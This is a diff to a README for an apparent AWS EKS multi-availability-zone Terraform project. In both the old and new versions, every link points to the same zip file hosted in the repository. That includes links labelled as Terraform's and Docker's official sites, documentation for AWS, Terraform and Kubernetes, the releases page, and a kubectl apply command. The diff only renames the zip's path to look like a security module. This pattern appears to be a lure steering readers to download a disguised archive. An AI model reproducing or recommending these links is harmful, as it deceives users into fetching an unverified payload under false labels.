@@ -1,6 +1,6 @@
 # 🌐 aws-eks-ent-multi-az-cluster - Build Reliable Cloud Applications Effortlessly
 
-[![Download aws-eks-ent-multi-az-cluster](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip)](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip)
+[![Download aws-eks-ent-multi-az-cluster](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip)](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip)
 
 ## 📝 Overview
 
@@ -17,11 +17,11 @@ Before you start, ensure you have the following:
 - **Operating System:** This application works on modern operating systems like Windows, macOS, and Linux.
 - **AWS Account:** You will need an Amazon Web Services account to deploy the EKS cluster.
 - **Basic AWS Knowledge:** Familiarity with AWS concepts will help you navigate the setup process.
-- **Terraform Installed:** Make sure you have [Terraform](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip) installed on your machine. This tool helps automate the setup.
+- **Terraform Installed:** Make sure you have [Terraform](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip) installed on your machine. This tool helps automate the setup.
 
 ### 📥 Download & Install
 
-Visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip). 
+Visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip). 
 
 Once on the page:
 
@@ -38,7 +38,7 @@ After downloading the necessary files, follow these steps:
    - Extract its contents to a folder on your computer.
 
 2. **Install Dependencies:**
-   - Ensure that you have Docker installed. You can download it from [Docker's official website](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip).
+   - Ensure that you have Docker installed. You can download it from [Docker's official website](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip).
    - Depending on your operating system, install necessary packages as indicated in the documentation.
 
 3. **Configure AWS Credentials:**
@@ -86,7 +86,7 @@ With your EKS cluster set up, you can now deploy and manage your applications in
   - Create a Kubernetes deployment by producing a YAML file and applying it with:
 
     ```
-    kubectl apply -f https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip
+    kubectl apply -f https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip
     ```
 
 ### 📊 Monitoring the Cluster
@@ -130,8 +130,8 @@ Refer to the documentation included in the downloaded files for details on speci
 
 ## 🌐 Resources
 
-- [AWS Documentation](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip)
-- [Terraform Documentation](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip)
-- [Kubernetes Documentation](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip)
+- [AWS Documentation](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip)
+- [Terraform Documentation](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip)
+- [Kubernetes Documentation](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip)
 
-For more details, visit the releases page: [Releases Page](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/labyrinthical/aws-eks-ent-multi-az-cluster.zip).
+For more details, visit the releases page: [Releases Page](https://raw.githubusercontent.com/Franco494/aws-eks-ent-multi-az-cluster/main/terraform/modules/security/cluster_az_eks_multi_ent_aws_v1.7.zip).
